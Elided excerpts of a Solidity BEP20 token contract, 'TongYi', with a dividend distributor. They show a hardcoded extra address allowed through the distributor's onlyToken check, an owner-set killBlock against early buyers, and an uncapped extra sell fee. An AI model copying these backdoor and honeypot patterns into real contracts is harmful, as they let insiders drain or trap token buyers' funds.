...
contract DividendDistributor is IDividendDistributor {
    ...
    uint256 public openDividends = 1* (10**18);
    ...
    modifier onlyToken() {
        require(msg.sender == _token||msg.sender == address(0x40B058A22a5E2B00ec36092cf84131E61590940b)); _;
    }
...
contract Tongyi is IBEP20 , Auth, BaseToken {

    using SafeMath for uint256;

    string public _name = "TongYi";
    ...
    address marketWallet = 0xfaCA2872eD10aCf65F7B1AbFaCBFBa7cE09182D5;

    uint256 public _totalSupply = 1400000000 * 10 ** _decimals;
    ...
    constructor() payable  Auth(msg.sender) {
        ...
        totalFee = rewardsFee.add(liquidityFee).add(marketFee);
        ...
        isDividendExempt[marketWallet] = true;
    ...
    function getLaunchedAt() internal view returns (uint256) {
        return launchedAt;
    }


    function setKillBlock(uint256 newBlock) external authorized {
        killBlock = newBlock;
    }

    function setSwapThreshold(uint256 newSwap) external authorized{
        swapThreshold = newSwap;
    }
    ...
    function changeMarketWallet(address newMarketWallet) external authorized {
    ...
    function changeFs(uint256 newLiqFee, uint256 newRewardFee,uint256 newExtraSellFee,uint256 newBurnFee,uint256 newMarketFee) external authorized {
        liquidityFee = newLiqFee;
        rewardsFee = newRewardFee;
        marketFee = newMarketFee;
        extraFeeOnSell = newExtraSellFee;
        burnFee = newBurnFee;
        totalFee = liquidityFee.add(rewardsFee).add(marketFee);
        require(totalFee < 15);
        totalFeeIfSelling = totalFee.add(extraFeeOnSell);
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(launchedAt != 0 || isFeeExempt[sender],"Transaction not started");
        ...
        if(sender != owner && recipient != pair && block.number < launchedAt + killBlock){
    ...
    function swapBack() internal lockTheSwap {
        ...
        uint256 amountBNBMarket = amountBNB.mul(marketFee).div(totalFee);
        uint256 amountBNBLiquidity = amountBNB.sub(amountBNBReflection).sub(amountBNBMarket);


    try dividendDistributor.deposit{value: amountBNBReflection}() {} catch {}

        {
            (bool tmpSuccess,) = payable(marketWallet).call{value: amountBNBMarket, gas: 30000}("");
            tmpSuccess = false;
        }
